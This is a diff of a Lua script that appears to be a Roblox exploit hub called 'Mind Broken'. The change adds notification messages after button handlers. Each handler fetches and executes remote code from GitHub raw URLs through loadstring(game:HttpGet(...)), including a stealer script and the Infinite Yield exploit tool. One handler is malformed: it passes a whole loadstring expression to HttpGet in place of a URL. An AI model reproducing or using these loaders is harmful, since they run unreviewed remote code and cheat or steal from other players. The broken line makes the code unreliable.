@@ -3005,19 +3005,24 @@ end)
 
 Reverse_Button.MouseButton1Click:Connect(function()
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/healing-myself/randomblah/main/retorno'))()
+	SendNotify("Mind Broken","Reverse Executado",3)
 end)
 
 Stall_Button.MouseButton1Click:Connect(function()
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/healing-myself/randomblah/main/basteal'))()
+	SendNotify("Mind Broken","StallStealer Executado",3)
 end)
 
 Natural_Button.MouseButton1Click:Connect(function()
 	loadstring(game:HttpGet('loadstring(game:HttpGet("https://raw.githubusercontent.com/LiverMods/Rawnder-NTDR/main/RetroBaseNTDR"))()'))()
+	SendNotify("Mind Broken","NaturalGui Executado",3)
 end)
 
 InfYield_Button.MouseButton1Click:Connect(function()
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+	SendNotify("Mind Broken","InfYield Executado",3)
 end)
+
 
 
 FreeEmotes_Button.MouseButton1Click:Connect(function()
